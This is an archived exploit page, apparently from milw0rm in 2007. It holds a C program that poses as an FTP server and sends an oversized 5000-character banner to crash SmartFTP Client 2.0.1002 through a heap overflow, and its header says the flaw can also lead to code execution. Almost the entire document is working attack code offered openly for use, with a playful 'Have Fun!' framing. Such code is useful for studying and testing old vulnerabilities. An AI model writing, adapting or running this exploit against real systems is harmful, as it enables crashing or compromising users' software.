<html><head><title>SmartFTP Client 2.0.1002 Remote Heap Overflow DoS Exploit</title></head><pre>/***************************************************************************
*              SmartFTP Client v 2.0.1002 Heap Overflow DoS                *
*                                                                          *
*                                                                          *
* There is remote heap overflow in SmartFTP. When the app receives a long  *
* banner (5000 char) the heap is smashed, leading to DoS and to code       *
* execution.                                                               *
*                                                                          *
* There are also two buffer overflow in the fields Address and Login.      *
* I've reported this to Secunia but it seems they didn't think it was dan- *
* gerous cause they didn't publish anything about. However a simple drag'n *
* drop could compromise your system...                                     *
*                                                                          *
* Have Fun!                                                                *
*                                                                          *
* Coded by Marsu &lt;Marsupilamipowa@hotmail.fr&gt;                              *
***************************************************************************/



#include &quot;winsock2.h&quot;
#include &quot;stdio.h&quot;
#include &quot;stdlib.h&quot;
#pragma comment(lib, &quot;ws2_32.lib&quot;)

int main(int argc, char* argv[])
{

	char evilbuff[5000];
	sockaddr_in sin;
	int server,client;
	WSADATA wsaData;
	WSAStartup(MAKEWORD(1,1), &amp;wsaData);

	server = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	sin.sin_family = PF_INET;
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_port = htons( 21 );
	bind(server,(SOCKADDR*)&amp;sin,sizeof(sin));
	printf(&quot;[*] Listening on port 21...\n&quot;);
	listen(server,5);
	printf(&quot;[*] Waiting for client ...\n&quot;);
	client=accept(server,NULL,NULL);
	printf(&quot;[+] Client connected\n&quot;);

	memset(evilbuff,'A',5000);
	memcpy(evilbuff,&quot;220 &quot;,4);
	memcpy(evilbuff+4997,&quot;\r\n\0&quot;,3);

	if (send(client,evilbuff,strlen(evilbuff),0)==-1)
	{
		printf(&quot;[-] Error in send!\n&quot;);
		exit(-1);
	}
	printf(&quot;[+] Data sent\n&quot;);

	Sleep(1500);

	if (send(client,&quot;boom?&quot;,5,0)==-1)
	    printf(&quot;[+] Crashed? Crashed!\n&quot;);
	else
		printf(&quot;[-] Exploit failed!\n&quot;);

	return 0;
}

// milw0rm.com [2007-02-06]</pre></html>